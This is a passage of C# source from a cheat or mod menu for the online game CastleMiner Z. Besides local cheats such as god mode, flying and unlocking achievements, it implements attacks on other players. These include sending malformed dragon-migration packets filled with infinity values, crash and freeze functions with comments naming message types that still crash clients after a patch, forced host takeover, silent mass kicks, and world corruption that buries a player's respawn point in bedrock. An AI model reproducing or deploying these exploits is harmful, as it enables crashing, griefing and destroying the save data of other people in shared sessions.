                    if (gamer != null)
                        PlayerExistsPrivate(CastleMinerZGame.Instance.MyNetworkGamer, gamer, true);
                }
                catch { }
                SendLog($"Forced Player Update To: {(gamer != null ? gamer.Gamertag : "null")}");
            };
            #endregion

            #region Invalid Dragon Migration

            Callbacks.OnInvalidDMigrationSelectedPlayer = async gamer =>
            {
                try
                {
                    var targetID = CastleMinerZGame.Instance?.MyNetworkGamer?.Id;
                    if (targetID == null) return;

                    // Exclude ourselves.
                    // if (targetID == CastleMinerZGame.Instance.MyNetworkGamer.Id) return;

                    // Spawn in a dragon under our manager.
                    SpawnDragonMessage.Send((LocalNetworkGamer)CastleMinerZGame.Instance.LocalPlayer.Gamer, (byte)targetID, DragonTypeEnum.FIRE, false, float.MaxValue);

                    // Send a short wait.
                    await Task.Delay(100);

                    // Check if we migrated.
                    var Migration = GetInvalidDragonInfo();
                    if (Migration == null)
                    {
                        SendLog("Migration skipped: No host dragon to snapshot yet.");
                        return;
                    }

                    // Migrate the invalid dragon to a targeted player.
                    MigrateDragonMessage.Send((LocalNetworkGamer)CastleMinerZGame.Instance.LocalPlayer.Gamer, gamer?.Id ?? 0, Migration);

                    // Remove new dragon.
                    if (EnemyManager.Instance.DragonIsActive) RemoveDragonMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer);
                }
                catch { }
                SendLog($"Sent Invalid Dragon Migration To: '{gamer.Gamertag}'");
            };

            /// <summary>
            /// Snapshot the current server-authoritative dragon state into a
            /// DragonHostMigrationInfo payload (used when migrating dragon ownership).
            /// </summary>
            DragonHostMigrationInfo GetInvalidDragonInfo()
            {
                var mgr          = EnemyManager.Instance;
                var latestDragon = DragonEntityRef(mgr);
                if (latestDragon == null) return null;

                return new DragonHostMigrationInfo
                {
                    Yaw               = float.PositiveInfinity,
                    TargetYaw         = float.PositiveInfinity,
                    Roll              = float.PositiveInfinity,
                    TargetRoll        = float.PositiveInfinity,
                    Pitch             = float.PositiveInfinity,
                    TargetPitch       = float.PositiveInfinity,
                    NextDragonTime    = float.PositiveInfinity,
                    NextUpdateTime    = float.PositiveInfinity,
                    Position          = new Vector3(float.PositiveInfinity),
                    Velocity          = float.PositiveInfinity,
                    TargetVelocity    = float.PositiveInfinity,
                    DefaultHeading    = float.PositiveInfinity,
                    NextFireballIndex = int.MaxValue,
                    ForBiome          = false,
                    Target            = new Vector3(float.PositiveInfinity),
                    EType             = DragonTypeEnum.COUNT,
                 // FlapDebt          = latestDragon.FlapDebt,
                 // Animation         = latestDragon.CurrentAnimation,
                };
            }
            #endregion

            #region Crash Selected Player

            // Valid Crashes (Post v1.9.8.0):
            // DNA.CastleMinerZ.Net.DetonateExplosiveMessage
            // DNA.CastleMinerZ.Net.DetonateRocketMessage
            // CastleMinerZGame.Instance.CurrentNetworkSession.SendRemoteData(null, 0, gamer);
            // Soft: AppointServerMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, byte.MaxValue);

            Callbacks.OnCrashSelectedPlayer = gamer =>
            {
                try { CrashSelectedPlayer(gamer); } catch { }
                SendLog($"Crashed Selected Players Game: '{gamer.Gamertag}'");
            };
            #endregion

            #region Corrupt Selected Player

            Callbacks.OnCorruptSelectedPlayer = gamer =>
            {
                /// <summary>
                /// Corrupt a players world by placing a hollow bedrock tube at both the respawn location.
                /// Since v1.9.9.8.1, the devs removed the ability to kick the real host. This was the
                /// only external method to trigger 'SaveDataInternal -> sdata.Worldinfo.LastPosition'.
                /// So as a workaround, we have two options:
                ///   A) Wait for the internal save data. This happens every 10s or if host leaves.
                ///   B) Also corrupt the players location.
                /// Option B allows us to instantly corrupt the player with certain success.
                /// </summary>

                // Exclude ourselves.
                // if (gamer == CastleMinerZGame.Instance.MyNetworkGamer) return;

                // In-game "Are you sure?" with OK/Cancel.
                CMZDialogBridge.ShowConfirm(
                    title:        $"WARNING: Corrupt Selected Player?",
                    body:         $"This will corrupt the world for player '{gamer.Gamertag}'\n\n" +
                                  $"Continue?",
                    onOK:         () => { CorruptSelectedPlayer(gamer); },
                    onCancel:     () => { return; },
                    showCancel:   true,
                    preferInGame: true
                );

                // Close ImGui overlay.
                ImGuiXnaRenderer.Visible = false;
            };
            #endregion

            /// === [All Players] ===

            #region Kill All Players

            Callbacks.OnKillAllPlayers = () =>
            {
                // In-game "Are you sure?" with OK/Cancel.
                CMZDialogBridge.ShowConfirm(
                    title:        $"WARNING: Restart All Players?",
                    body:         $"This will restart the game for 'all players'\n\n" +
                                  $"Continue?",
                    onOK:         () => { _killAllPlayers(); },
                    onCancel:     () => { return; },
                    showCancel:   true,
                    preferInGame: true
                );

                // Close ImGui overlay.
                ImGuiXnaRenderer.Visible = false;

                void _killAllPlayers()
                {
                    try { KillAllPlayers(); } catch { }
                    SendLog("Kill All Players.");
                }
            };
            #endregion

            #region Restart All Players

            Callbacks.OnRestartAllPlayers = () =>
            {
                // In-game "Are you sure?" with OK/Cancel.
                CMZDialogBridge.ShowConfirm(
                    title:        $"WARNING: Restart All Players?",
                    body:         $"This will restart the game for 'all players'\n\n" +
                                  $"Continue?",
                    onOK:         () => { _restartAllPlayers(); },
                    onCancel:     () => { return; },
                    showCancel:   true,
                    preferInGame: true
                );

                // Close ImGui overlay.
                ImGuiXnaRenderer.Visible = false;

                void _restartAllPlayers()
                {
                    try { RestartLevelMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer); } catch { }
                    SendLog("Restarted All Players.");
                }
            };
            #endregion

            #region Kick All Players

            Callbacks.OnKickAllPlayers = () =>
            {
                try { KickAllPlayers(); } catch { }
                SendLog("Silently Kicked All Players.");
            };

            void KickAllPlayers()
            {
                // 1) Kick all non-host players.
                foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                    if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                // Exclude ourselves.
                        if (!((Player)networkGamer.Tag).Gamer.IsHost)                                            // Ensure the gamer is not the host.
                        {
                            KickPlayerPrivate(CastleMinerZGame.Instance.MyNetworkGamer, networkGamer);
                        }

                // 2) Kick host last.
                foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                    if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                // Exclude ourselves.
                        if (((Player)networkGamer.Tag).Gamer.IsHost)                                             // Ensure the gamer is not the host.
                        {
                            KickPlayerPrivate(CastleMinerZGame.Instance.MyNetworkGamer, networkGamer);
                            break;
                        }
            }
            #endregion

            #region Freeze All Players

            Callbacks.OnFreezeAllPlayers = async () =>
            {
                // In-game "Are you sure?" with OK/Cancel.
                CMZDialogBridge.ShowConfirm(
                    title:        $"WARNING: Freeze All Players?",
                    body:         $"This will freeze the game of 'all players'\n\n" +
                                  $"Continue?",
                    onOK:         () => { FreezeAllPlayers(); },
                    onCancel:     () => { return; },
                    showCancel:   true,
                    preferInGame: true
                );

                // Close ImGui overlay.
                ImGuiXnaRenderer.Visible = false;
            };
            #endregion

            #region Crash All Players

            Callbacks.OnCrashAllPlayers = async () =>
            {
                // In-game "Are you sure?" with OK/Cancel.
                CMZDialogBridge.ShowConfirm(
                    title:        $"WARNING: Crash All Players?",
                    body:         $"This will crash the game of 'all players'\n\n" +
                                  $"Continue?",
                    onOK:         () => { CrashAllPlayers(); },
                    onCancel:     () => { return; },
                    showCancel:   true,
                    preferInGame: true
                );

                // Close ImGui overlay.
                ImGuiXnaRenderer.Visible = false;
            };
            #endregion

            #region Corrupt All Players

            Callbacks.OnCorruptAllPlayers = async () =>
            {
                // In-game "Are you sure?" with OK/Cancel.
                CMZDialogBridge.ShowConfirm(
                    title:        $"WARNING: Corrupt All Players?",
                    body:         $"This will corrupt the world for 'all players'\n\n" +
                                  $"Continue?",
                    onOK:         () => { CorruptAllPlayers(); },
                    onCancel:     () => { return; },
                    showCancel:   true,
                    preferInGame: true
                );

                // Close ImGui overlay.
                ImGuiXnaRenderer.Visible = false;
            };
            #endregion

            /// === [Local Player] ===

            #region Drop All Items

            Callbacks.OnDropAllItems = () =>
            {
                try { CastleMinerZGame.Instance.LocalPlayer.PlayerInventory.DropAll(true); } catch { }
                SendLog("Dropped All Items");
            };
            #endregion

            #region Revive Player

            Callbacks.OnRevivePlayer = () =>
            {
                try
                {
                    CastleMinerZGame.Instance.LocalPlayer.Dead             = false;
                    CastleMinerZGame.Instance.LocalPlayer.FPSMode          = false;
                    CastleMinerZGame.Instance.GameScreen.HUD.PlayerHealth  = 1.0f;
                    CastleMinerZGame.Instance.GameScreen.HUD.PlayerStamina = 1.0f;
                    InGameHUD.Instance.RefreshPlayer();
                } catch { }
                SendLog("Revived Local Player");
            };
            #endregion

            #region Unlock All Modes

            Callbacks.OnUnlockAllModes = () =>
            {
                try { UnlockAllModes(); } catch { }
                SendLog("Unlocked All Modes");
            };

            /// <summary>
            /// Unlocks Dragon Endurance mode by setting the required dragon kill stat.
            /// </summary>
            void UnlockAllModes()
            {
                CastleMinerZGame.Instance.PlayerStats.UndeadDragonKills = 1;
            }
            #endregion

            #region Unlock All Achievements

            Callbacks.OnUnlockAllAchievements = () =>
            {
                try { UnlockAllAchievements(); } catch { }
                SendLog("Unlocked All Achievements");
            };

            void UnlockAllAchievements()
            {
                for (int achievement = 0; achievement < CastleMinerZGame.Instance.AcheivmentManager.Achievements.Length; achievement++)
                {
                    CastleMinerZGame.Instance.AcheivmentManager.OnAchieved(CastleMinerZGame.Instance.AcheivmentManager.Achievements[achievement]);
                }
            }
            #endregion

            #region Max Stack All Items

            Callbacks.OnMaxStackAllItems = () =>
            {
                try { MaxStackAllItems(); } catch { }
                SendLog("Max Stacked All Items");
            };

            /// <summary>
            /// Sets all stackable items in the local player's inventory and trays to their maximum stack count.
            /// </summary>
            void MaxStackAllItems()
            {
                var pi = CastleMinerZGame.Instance?.LocalPlayer?.PlayerInventory;
                if (pi == null)
                    return;

                // Main inventory.
                for (int i = 0; i < pi.Inventory.Length; i++)
                {
                    var item = pi.Inventory[i];
                    if (item == null || item.ItemClass == null)
                        continue;

                    if (item.MaxStackCount > 1)
                        item.StackCount = item.MaxStackCount;
                }

                // Both active trays.
                for (int tray = 0; tray < 2; tray++)
                {
                    for (int slot = 0; slot < 8; slot++)
                    {
                        var item = pi.TrayManager.Trays[tray, slot];
                        if (item == null || item.ItemClass == null)
                            continue;

                        if (item.MaxStackCount > 1)
                            item.StackCount = item.MaxStackCount;
                    }
                }
            }
            #endregion

            #region Max Health All Items

            Callbacks.OnMaxHealthAllItems = () =>
            {
                try { MaxHealthAllItems(); } catch { }
                SendLog("Repaired All Items");
            };

            /// <summary>
            /// Restores all damageable items in the local player's inventory and trays to full durability.
            /// </summary>
            void MaxHealthAllItems()
            {
                var pi = CastleMinerZGame.Instance?.LocalPlayer?.PlayerInventory;
                if (pi == null)
                    return;

                // Main inventory.
                for (int i = 0; i < pi.Inventory.Length; i++)
                {
                    var item = pi.Inventory[i];
                    if (item == null || item.ItemClass == null)
                        continue;

                    if (item.ItemClass.ItemSelfDamagePerUse > 0f)
                        item.ItemHealthLevel = 1f;
                }

                // Both active trays.
                for (int tray = 0; tray < 2; tray++)
                {
                    for (int slot = 0; slot < 8; slot++)
                    {
                        var item = pi.TrayManager.Trays[tray, slot];
                        if (item == null || item.ItemClass == null)
                            continue;

                        if (item.ItemClass.ItemSelfDamagePerUse > 0f)
                            item.ItemHealthLevel = 1f;
                    }
                }
            }
            #endregion

            /// === [World / Entities] ===

            #region Kill All Mobs

            Callbacks.OnKillAllMobs = () =>
            {
                try { KillAllMonsters(); } catch { }
                SendLog("Kill All Mobs.");
            };
            #endregion

            #region Clear Ground Items

            Callbacks.OnClearGroundItems = () =>
            {
                try { ClearGroundItems(); } catch { }
                SendLog("Cleared All Ground Items");
            };

            void ClearGroundItems()
            {
                while (PickupManager.Instance.Pickups.Count > 0)
                    PickupManager.Instance.Pickups.ForEach(delegate (PickupEntity entity)
                    {
                        PickupManager.Instance.RemovePickup(entity);
                    });
            }
            #endregion

            #region Activate Spawners

            Callbacks.OnActivateSpawners = () =>
            {
                var pos = CastleMinerZGame.Instance?.LocalPlayer.LocalPosition ?? Vector3.Zero;

                int found = ActivateSpawners(pos, 100);
                SendLog($"Repaired & Activated Spawners Within '{100}' Blocks | Found: [{found}]");
            };

            /// <summary>
            /// Scan around <paramref name="pos"/> and repair/start spawners.
            /// Returns the number of spawners found/started.
            /// </summary>
            int ActivateSpawners(Vector3 pos, int radius= 100)
            {
                // Need a local gamer to send AlterBlockMessage.
                if (!(CastleMinerZGame.Instance?.LocalPlayer?.Gamer is LocalNetworkGamer local))
                    return 0;

                // Center at integer world coords.
                IntVector3 center = (IntVector3)pos;

                int found = 0;

                for (int y = -radius; y <= radius; y++)
                {
                    int worldY = center.Y + y;

                    // Ensure Y is within the world's height constraints.
                    if (worldY < -64 || worldY > 64)
                        continue;

                    for (int x = -radius; x <= radius; x++)
                    {
                        int worldX = center.X + x;

                        for (int z = -radius; z <= radius; z++)
                        {
                            int worldZ = center.Z + z;

                            IntVector3 newPos = new IntVector3(worldX, worldY, worldZ);

                            BlockTypeEnum bt = InGameHUD.GetBlock(newPos);
                            if (!IsSpawnerBlock(bt))
                                continue;

                            try
                            {
                                // Normalize to the Off variant for this spawner family.
                                BlockTypeEnum off = ToSpawnerOffVariant(bt);

                                // "Repair" sequence (old mod frequently did Empty -> Off).
                                // Only do it when we're not already Off, to reduce packet spam.
                                if (bt != off)
                                {
                                    AlterBlockMessage.Send(local, newPos, BlockTypeEnum.Empty);
                                    AlterBlockMessage.Send(local, newPos, off);
                                }

                                // Fetch/create spawner object and activate it.
                                Spawner spawner = CastleMinerZGame.Instance.CurrentWorld.GetSpawner(newPos, true, off);
                                if (spawner != null)
                                {
                                    spawner.SetState(Spawner.SpawnState.Listening);
                                    spawner.StartSpawner(off);
                                    found++;
                                }
                            }
                            catch
                            {
                                // Ignore per-block failures.
                            }
                        }
                    }
                }

                return found;
            }

            #region Helpers

            /// <summary>
            /// True if the block type is any known spawner block (On / Off / Dim).
            /// </summary>
            bool IsSpawnerBlock(BlockTypeEnum bt)
            {
                switch (bt)
                {
                    case BlockTypeEnum.AlienSpawnOff:
                    case BlockTypeEnum.AlienSpawnOn:
                    case BlockTypeEnum.AlienSpawnDim:

                    case BlockTypeEnum.AlienHordeOff:
                    case BlockTypeEnum.AlienHordeOn:
                    case BlockTypeEnum.AlienHordeDim:

                    case BlockTypeEnum.BossSpawnOff:
                    case BlockTypeEnum.BossSpawnOn:
                    case BlockTypeEnum.BossSpawnDim:

                    case BlockTypeEnum.EnemySpawnOff:
                    case BlockTypeEnum.EnemySpawnOn:
                    case BlockTypeEnum.EnemySpawnDim:

                    case BlockTypeEnum.EnemySpawnRareOff:
                    case BlockTypeEnum.EnemySpawnRareOn:
                    case BlockTypeEnum.EnemySpawnRareDim:

                    case BlockTypeEnum.HellSpawnOff:
                    case BlockTypeEnum.HellSpawnOn:
                    case BlockTypeEnum.HellSpawnDim:
                        return true;

                    default:
                        return false;
                }
            }

            /// <summary>
            /// Convert any spawner variant to its corresponding Off variant.
            /// </summary>
            BlockTypeEnum ToSpawnerOffVariant(BlockTypeEnum bt)
            {
                switch (bt)
                {
                    // Alien.
                    case BlockTypeEnum.AlienSpawnOn:
                    case BlockTypeEnum.AlienSpawnDim:
                    case BlockTypeEnum.AlienSpawnOff:
                        return BlockTypeEnum.AlienSpawnOff;

                    // Alien Horde.
                    case BlockTypeEnum.AlienHordeOn:
                    case BlockTypeEnum.AlienHordeDim:
                    case BlockTypeEnum.AlienHordeOff:
                        return BlockTypeEnum.AlienHordeOff;

                    // Boss.
                    case BlockTypeEnum.BossSpawnOn:
                    case BlockTypeEnum.BossSpawnDim:
                    case BlockTypeEnum.BossSpawnOff:
                        return BlockTypeEnum.BossSpawnOff;

                    // Enemy (common).
                    case BlockTypeEnum.EnemySpawnOn:
                    case BlockTypeEnum.EnemySpawnDim:
                    case BlockTypeEnum.EnemySpawnOff:
                        return BlockTypeEnum.EnemySpawnOff;

                    // Enemy (rare).
                    case BlockTypeEnum.EnemySpawnRareOn:
                    case BlockTypeEnum.EnemySpawnRareDim:
                    case BlockTypeEnum.EnemySpawnRareOff:
                        return BlockTypeEnum.EnemySpawnRareOff;

                    // Hell.
                    case BlockTypeEnum.HellSpawnOn:
                    case BlockTypeEnum.HellSpawnDim:
                    case BlockTypeEnum.HellSpawnOff:
                        return BlockTypeEnum.HellSpawnOff;

                    default:
                        // If we somehow got called with a non-spawner, just return it unchanged.
                        return bt;
                }
            }
            #endregion

            #endregion

            #region Remove Dragon Message

            Callbacks.OnRemoveDragonMsg = () =>
            {
                try {
                    if (EnemyManager.Instance?.DragonIsActive ?? false) RemoveDragonMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer); // Remove existing dragon.
                } catch { }
                SendLog((EnemyManager.Instance?.DragonIsActive ?? false) ? "Removed dragon." : "No dragons to remove.");
            };
            #endregion

            #region Current Dragon HP

            Callbacks.OnCurrentDragonHP = () =>
            {
                float dragonsHP = 0f;
                try { dragonsHP = DragonsHP(); } catch { }
                SendLog($"Current Dragon HP: {dragonsHP}");
            };

            /// <summary>
            /// Gets the current dragon client health value from EnemyManager.
            /// Returns 0 if no valid dragon client is available.
            /// </summary>
            float DragonsHP()
            {
                // Fetch the private EnemyManager._dragonClient (DragonClientEntity) efficiently.
                // Harmony's FieldRefAccess returns a typed delegate, avoiding repeated reflection.
                DragonClientEntity dragonClient =
                    AccessTools.FieldRefAccess<EnemyManager, DragonClientEntity>("_dragonClient")
                               (EnemyManager.Instance);

                // Ensure the dragon client is valid and not null.
                if (dragonClient == null || !(dragonClient is DragonClientEntity dragon)) return 0;

                // Current total "health" reported by the dragon client.
                // (Cast to int to match the original math and ensure integer division below.)
                return dragon.Health;
            }
            #endregion

            #region Clear Projectiles

            Callbacks.OnClearProjectiles = () =>
            {
                int removed = 0;
                try { removed = ClearProjectiles(); } catch { }
                SendLog($"Cleared Projectiles | Removed: [{removed}]");
            };

            int ClearProjectiles()
            {
                int removed = 0;

                var scene = BlockTerrain.Instance?.Scene;
                if (scene?.Children != null)
                {
                    var kids = scene.Children.ToArray();

                    foreach (var child in kids)
                    {
                        if (child == null)
                            continue;

                        if (child is GrenadeProjectile ||
                            child is RocketEntity ||
                            child is FireballEntity ||
                            child is BlasterShot)
                        {
                            try
                            {
                                scene.Children.Remove(child);
                                removed++;
                            }
                            catch { }
                        }
                    }
                }

                try
                {
                    var fiFireballs = AccessTools.Field(typeof(EnemyManager), "_fireballs");
                    if (fiFireballs?.GetValue(EnemyManager.Instance) is List<FireballEntity> fireballs)
                    {
                        removed += fireballs.Count;
                        fireballs.Clear();
                    }
                }
                catch { }

                return removed;
            }
            #endregion

            #region cNoEvil (Cave Lighter)

            Callbacks.OnCaveLighter = () =>
            {
                int placed = 0;
                try { placed = PlaceCNoEvilTorchesOnce(_caveLighterMaxDistanceValue); } catch { }
                SendLog($"Cave Lighter | Range: [{_caveLighterMaxDistanceValue}] | Placed: [{placed}]");
            };
            Callbacks.OnCaveLighterMaxDistanceValue = value =>
            {
                _caveLighterMaxDistanceValue = value;
            };

            /// <summary>
            /// Scans all columns within range around the player from world top to bottom,
            /// placing torches in valid dark underground spots.
            /// </summary>
            int PlaceCNoEvilTorchesOnce(int maxDistance)
            {
                var game = CastleMinerZGame.Instance;
                var player = game?.LocalPlayer;

                if (game == null || player == null || !(game.MyNetworkGamer is LocalNetworkGamer me))
                    return 0;

                IntVector3 center = (IntVector3)player.LocalPosition;

                int placed = 0;
                const int MinTorchSpacing = 4;

                var placedThisRun = new List<IntVector3>();
                int maxDistSq = maxDistance * maxDistance;

                GetWorldBounds(out _, out _, out int minY, out int maxY, out _, out _);

                for (int x = -maxDistance; x <= maxDistance; x++)
                {
                    for (int z = -maxDistance; z <= maxDistance; z++)
                    {
                        int horizDistSq = (x * x) + (z * z);
                        if (horizDistSq > maxDistSq)
                            continue;

                        int worldX = center.X + x;
                        int worldZ = center.Z + z;

                        // Scan this whole vertical column from top to bottom.
                        for (int y = maxY; y >= minY; y--)
                        {
                            IntVector3 cell = new IntVector3(worldX, y, worldZ);
                            IntVector3 below = new IntVector3(worldX, y - 1, worldZ);

                            if (InGameHUD.GetBlock(cell) != BlockTypeEnum.Empty)
                                continue;

                            if (!IsSolidSupport(below))
                                continue;

                            if (HasNearbyLight(cell, MinTorchSpacing))
                                continue;

                            if (HasNearbyPlacedTorch(cell, placedThisRun, MinTorchSpacing))
                                continue;

                            if (!IsVeryDark(cell))
                                continue;

                            AlterBlockMessage.Send(me, cell, BlockTypeEnum.Torch);
                            placedThisRun.Add(cell);
                            placed++;

                            // Only place one torch per (x,z) column.
                            break;
                        }
                    }
                }

                return placed;
            }

            #region Cave Lighter Functions

            /// <summary>
            /// Checks whether a candidate torch position is within the given radius
            /// of any torch placed earlier during the current run.
            /// </summary>
            bool HasNearbyPlacedTorch(IntVector3 cell, List<IntVector3> placed, int radius)
            {
                for (int i = 0; i < placed.Count; i++)
                {
                    IntVector3 p = placed[i];

                    int dx = p.X - cell.X;
                    int dy = p.Y - cell.Y;
                    int dz = p.Z - cell.Z;

                    if ((dx * dx) + (dy * dy) + (dz * dz) <= radius * radius)
                        return true;
                }

                return false;
            }

            /// <summary>
            /// Checks for nearby placed light sources around the given position
            /// within the specified search radius.
            /// </summary>
            bool HasNearbyLight(IntVector3 center, int radius)
            {
                for (int y = -1; y <= 1; y++)
                {
                    for (int x = -radius; x <= radius; x++)
                    {
                        for (int z = -radius; z <= radius; z++)
                        {
                            IntVector3 p = new IntVector3(center.X + x, center.Y + y, center.Z + z);
                            BlockTypeEnum bt = InGameHUD.GetBlock(p);

                            if (bt == BlockTypeEnum.Torch ||
                                bt == BlockTypeEnum.Lantern ||
                                bt == BlockTypeEnum.LanternFancy ||
                                bt == BlockTypeEnum.FixedLantern)
                            {
                                return true;
                            }
                        }
                    }
                }

                return false;
            }

            /// <summary>
            /// Checks whether the given world position is at a very low light level,
            /// with no sunlight and little or no nearby torch light.
            /// </summary>
            bool IsVeryDark(IntVector3 cell)
            {
                if (!TryGetPackedBlockRaw(cell, out int raw))
                    return false;

                int sun   = Block.GetSunLightLevel(raw);
                int torch = Block.GetTorchLightLevel(raw);
                return sun == 0 && torch <= 1;
            }

            /// <summary>
            /// Checks whether the given world position contains a solid support block
            /// that can block player movement / support torch placement.
            /// </summary>
            bool IsSolidSupport(IntVector3 cell)
            {
                if (!TryGetPackedBlockRaw(cell, out int raw))
                    return false;

                BlockType bt = Block.GetType(raw);
                return bt != null && bt.BlockPlayer;
            }

            /// <summary>
            /// Tries to get the packed raw block data at a world block position.
            /// Returns false if the position is outside the loaded world.
            /// </summary>
            bool TryGetPackedBlockRaw(IntVector3 worldIndex, out int raw)
            {
                raw = 0;

                var terrain = BlockTerrain.Instance;
                if (terrain == null || !terrain.IsReady)
                    return false;

                int index = terrain.MakeIndexFromWorldIndexVector(worldIndex);
                if (index < 0)
                    return false;

                raw = terrain.GetBlockAt(index);
                return true;
            }

            /// <summary>
            /// Gets the current world-space block bounds for the loaded terrain.
            /// </summary>
            void GetWorldBounds(out int minX, out int maxX, out int minY, out int maxY, out int minZ, out int maxZ)
            {
                var terrain = BlockTerrain.Instance;

                // Index vector (0,0,0) maps to the world's minimum block coordinate.
                Vector3 minPos = terrain.MakePositionFromIndexVector(IntVector3.Zero);

                minX = (int)Math.Floor(minPos.X);
                minY = (int)Math.Floor(minPos.Y);
                minZ = (int)Math.Floor(minPos.Z);

                // CMZ terrain dimensions are 384 x 128 x 384.
                maxX = minX + 383;
                maxY = minY + 127;
                maxZ = minZ + 383;
            }
            #endregion

            #endregion

            /// === [Debug] ===

            #region Debug

            Callbacks.OnStatsWindow = () =>
            {
                try
                {
                    // Toggle the test stats bool.
                    _showStatsWindow = !_showStatsWindow;

                    // Toggle the little always-on ImGui stats panel.
                    IGMainUI.TestStatsVisible = _showStatsWindow;
                }
                catch { }
                SendLog($"Show Test Stats: {_showStatsWindow}");
            };
            #endregion

            #region Show Demo Window

            // Handled in IGMainUI.cs.

            #endregion


            // ========== //
            // Checkboxes //
            // ========== //

            /// === [Player] ===

            #region God

            Callbacks.OnGod = enabled =>
            {
                _godEnabled = enabled;
                SendLog($"God: {enabled}");
            };
            #endregion

            #region No Kick

            Callbacks.OnNoKick = enabled =>
            {
                _noKickEnabled = enabled;
                SendLog($"No Kick: {enabled}");
            };
            #endregion

            #region No TP On Restart

            Callbacks.OnNoTPOnServerRestart = enabled =>
            {
                _noTPOnServerRestartEnabled = enabled;
                SendLog($"No TP On Restart: {enabled}");
            };
            #endregion

            #region No Inventory Retrieval

            Callbacks.OnDisableInvRetrieval = enabled =>
            {
                _disableInvRetrievalEnabled = enabled;
                SendLog($"No Inv Retrieval: {enabled}");
            };
            #endregion

            #region No Item Pickups

            Callbacks.OnDisableItemPickups = enabled =>
            {
                _disableItemPickupEnabled = enabled;
                SendLog($"No Item Pickups: {enabled}");
            };
            #endregion

            #region No Chat Newlines

            Callbacks.OnIgnoreChatNewlines = enabled =>
            {
                NewlineChatConfig.IgnoreChatNewlines = enabled;
                SendLog($"No Chat Newlines: {enabled}");
            };
            #endregion

            #region Host

            byte? _origHostId = null;
            Callbacks.OnHost = enabled =>
            {
                try
                {
                    var game    = CastleMinerZGame.Instance;
                    var session = game?.CurrentNetworkSession;

                    if (enabled)
                    {

                        // Remember original host once per enable.
                        if (_origHostId == null)
                        {
                            var orig = session.Host; // Current server authority.
                            _origHostId = orig?.Id;
                        }

                        // Take host.
                        ForceHostMigration(CastleMinerZGame.Instance.MyNetworkGamer.Id);
                        SendLog("Host: ON (requested self as host)");
                    }
                    else
                    {
                        // Give it back, if we know who it was and they're still here
                        if (_origHostId.HasValue)
                        {
                            var target = FindGamerById(session.AllGamers, _origHostId.Value);
                            if (target != null && !target.HasLeftSession)
                            {
                                ForceHostMigration(target.Id);
                                SendLog($"Host: OFF (restored to '{target.Gamertag ?? _origHostId.Value.ToString()}')");
                            }
                            else
                            {
                                SendLog("Host: OFF (original host not found in session; leaving current host)");
                            }

                            // Clear snapshot so next ON captures a fresh original.
                            _origHostId = null;
                        }
                        else
                        {
                            SendLog("Host: OFF (no original host snapshot)");
                        }
                    }
                }
                catch { }
            };

            /// <summary>
            /// Find a NetworkGamer by its byte id (no LINQ; safe for hot paths).
            /// Returns null if not found.
            /// </summary>
            NetworkGamer FindGamerById(GamerCollection<NetworkGamer> col, byte id)
            {
                // Uses indexer/Count so it's fast and avoids LINQ.
                for (int i = 0; i < col.Count; i++)
                {
                    var g = col[i];
                    if (g != null && g.Id == id)
                        return g;
                }
                return null;
            }
            #endregion

            #region Creative Mode

            Callbacks.OnCreativeMode = enabled =>
            {
                GameModeTypes _originalGameMode = GameModeTypes.Survival;

                try
                {
                    if (enabled)
                    {
                        _originalGameMode = CastleMinerZGame.Instance.GameMode;      // Fetch this sessions original gamemode.
                        CastleMinerZGame.Instance.GameMode = GameModeTypes.Creative; // Set our gamemode to creative.
                    }
                    else
                    {
                        CastleMinerZGame.Instance.GameMode = _originalGameMode;      // Restore our gamemode to the original.
                    }
                }
                catch { }
                SendLog($"Creative Mode: {enabled}");
            };
            #endregion

            #region Fly Mode

            Callbacks.OnFlyMode = enabled =>
            {
                try { CastleMinerZGame.Instance.LocalPlayer.FlyMode = enabled; } catch { }
                SendLog($"Fly Mode: {enabled}");
            };
            #endregion

            #region Player Position

            Callbacks.OnPlayerPosition = enabled =>
            {
                _playerPositionEnabled = enabled;
                SendLog($"Player Position: {enabled}");
            };
            #endregion

            #region Movement Speed

            float _originalPlayerSpeed = float.NaN;
            Callbacks.OnMovementSpeed = enabled =>
            {
                _movementSpeedEnabled = enabled;

                try
                {
                    var player = CastleMinerZGame.Instance.LocalPlayer;
                    if (enabled)
                    {
                        _originalPlayerSpeed = GetSprintMult(player);
                        SetSprintMult(player, _speedScale);
                    }
                    else
                    {
                        SetSprintMult(player, _originalPlayerSpeed);
                    }
                }
                catch { }
                SendLog($"Speed: {enabled}");
            };
            Callbacks.OnSpeedScale = value =>
            {
                try
                {
                    if (_movementSpeedEnabled)
                    {
                        var player = CastleMinerZGame.Instance.LocalPlayer;
                        SetSprintMult(player, value);
                    }
                } catch { }
            };

            float GetSprintMult(Player player)
            {
                if (player == null || SprintMultRef == null) return 0f;
                return SprintMultRef(player);
            }
            void SetSprintMult(Player player, float value)
            {
                if (player == null || SprintMultRef == null) return;
                SprintMultRef(player) = value;
            }
            #endregion

            #region Infinite Jump

            Callbacks.OnInfiniteJump = enabled =>
            {
                try { CastleMinerZGame.Instance.LocalPlayer.JumpCountLimit = enabled ? int.MaxValue : 1; } catch { }
                SendLog($"Inf Jump: {enabled}");
            };
            #endregion

            #region Vanish

            Callbacks.OnVanish = enabled =>
            {
                _vanishEnabled = enabled;

                if (!enabled)
                    _vanishScope = VanishSelectScope.InPlace;

                if (enabled)
                    _vanishLocation = CastleMinerZGame.Instance?.LocalPlayer?.LocalPosition ?? Vector3.Zero;

                SendLog($"Vanish: {enabled}");
            };
            Callbacks.OnVanishIsDead = enabled =>
            {
                _vanishIsDeadEnabled = enabled;
                SendLog($"Vanish: Player Is Dead: {enabled}");
            };
            Callbacks.OnVanishScope = value =>
            {
                _vanishLocation = CastleMinerZGame.Instance?.LocalPlayer?.LocalPosition ?? Vector3.Zero;
                _vanishScope    = (VanishSelectScope)value;
                SendLog($"Vanish Mode: {value}");
            };
            #endregion

            #region Extended Pickup Range

            Callbacks.OnPickupRange = enabled =>
            {
                _pickupRangeEnabled = enabled;

                try
                {
                    if (enabled)
                        _extendedPickupRange = _pickupScale;
                }
                catch { }
                SendLog($"Pickup Range: {enabled}");
